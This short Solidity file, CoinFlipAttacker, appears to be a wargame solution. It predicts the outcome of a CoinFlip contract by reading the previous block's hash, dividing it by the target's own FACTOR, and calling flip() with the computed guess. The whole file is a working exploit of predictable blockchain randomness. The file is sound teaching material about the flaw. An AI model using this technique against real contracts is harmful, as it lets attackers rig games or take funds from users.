// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './CoinFlip.sol';
import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlipAttacker {

    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address _attack_address;

    constructor(address _attack_address_in) public {
        _attack_address = _attack_address_in;
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 guess = blockValue.div(FACTOR);
        bool side = guess == 1 ? true : false;

        CoinFlip(_attack_address).flip(side);
    }

    
}